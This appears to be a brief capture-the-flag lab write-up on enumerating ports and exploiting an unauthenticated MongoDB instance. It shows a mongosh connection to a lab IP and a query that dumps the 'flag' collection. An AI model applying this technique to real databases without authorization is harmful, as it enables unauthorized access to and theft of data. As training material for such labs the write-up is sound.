> [!Note] What this box taught
> 1. Enumeration on all ports
> 2. Enumerate and exploit null sessions on mongodb

## Exploitation
Using null version and a specific version of mongosh
```
┌──(atlas㉿kali)-[~/GitHubTools/mongosh-2.3.2-linux-x64/bin]
└─$ ./mongosh mongodb://10.129.228.30:27017 
```

show json format of a collection, this case, flag collection
```
db.flag.find().pretty()
```

